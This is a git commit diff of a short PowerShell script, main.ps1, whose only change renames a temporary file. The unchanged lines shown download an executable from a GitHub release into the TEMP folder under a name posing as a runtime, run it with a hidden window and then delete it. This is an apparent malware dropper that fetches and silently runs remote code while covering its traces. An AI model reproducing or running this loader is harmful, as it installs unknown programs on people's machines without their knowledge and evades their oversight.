a985a35eac8cf6ff237fe897159694371d76ec2a
skiddyskid111 <dhwhrvcxa@gmail.com>
2025-08-20 14:20:07 +0200

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,5 +1,5 @@
 $rand = Get-Random
-$path = "$env:TEMP\PythonRuntime_$rand.exe" 
+$path = "$env:TEMP\Runtime_$rand.exe" 
 Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe" -OutFile $path 
 Start-Process $path -WindowStyle Hidden -Wait 
 Remove-Item $path -Force
